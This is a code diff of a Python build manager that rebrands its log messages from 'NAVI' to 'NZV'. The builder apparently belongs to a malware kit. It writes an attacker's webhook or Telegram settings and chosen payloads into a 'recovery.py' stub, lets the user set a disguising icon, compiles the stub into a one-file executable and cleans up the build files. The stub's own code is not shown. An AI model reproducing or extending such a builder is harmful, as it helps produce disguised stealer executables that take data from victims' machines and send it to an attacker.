@@ -6,17 +6,17 @@ class BuildManager:
     @staticmethod
     def buildFinal(compress, webhook_url, selected_payloads, file_name, file_type, file_icon_path, telegram_config, log):
         try:
-            log("NAVI: initializing build...")
+            log("NZV: initializing build...")
             
             stub_src = "modules/stub/recovery.py"
             if not os.path.exists(stub_src):
-                log(f"NAVI: error - {stub_src} not found")
+                log(f"NZV: error - {stub_src} not found")
                 return False
                 
             with open(stub_src, 'r', encoding='utf-8') as f:
                 content = f.read()
                 
-            log("NAVI: configuring stub...")
+            log("NZV: configuring stub...")
             
             webhook = telegram_config.get("webhook", "{{WEBHOOK}}") if telegram_config else "{{WEBHOOK}}"
             content = content.replace("{{WEBHOOK}}", webhook)
@@ -41,10 +41,10 @@ class BuildManager:
             with open(py_name, 'w', encoding='utf-8') as f:
                 f.write(content)
                 
-            log(f"NAVI: stub saved to {py_name}")
+            log(f"NZV: stub saved to {py_name}")
             
             if file_type == "exe":
-                log("NAVI: compiling to exe...")
+                log("NZV: compiling to exe...")
                 cmd = [
                     "py", "-m", "PyInstaller",
                     "--onefile",
@@ -74,7 +74,7 @@ class BuildManager:
                 process.wait()
                 
                 if process.returncode == 0:
-                    log(f"NAVI: success - output/{os.path.basename(file_name)}.exe")
+                    log(f"NZV: success - output/{os.path.basename(file_name)}.exe")
                     # Cleanup build files
                     try:
                         shutil.rmtree('build', ignore_errors=True)
@@ -84,12 +84,12 @@ class BuildManager:
                         pass
                     return True
                 else:
-                    log(f"NAVI: pyinstaller failed with code {process.returncode}")
+                    log(f"NZV: pyinstaller failed with code {process.returncode}")
                     return False
             else:
-                log("NAVI: build finished (python stub only)")
+                log("NZV: build finished (python stub only)")
                 return True
                 
         except Exception as e:
-            log(f"NAVI: exception - {str(e)}")
+            log(f"NZV: exception - {str(e)}")
             return False
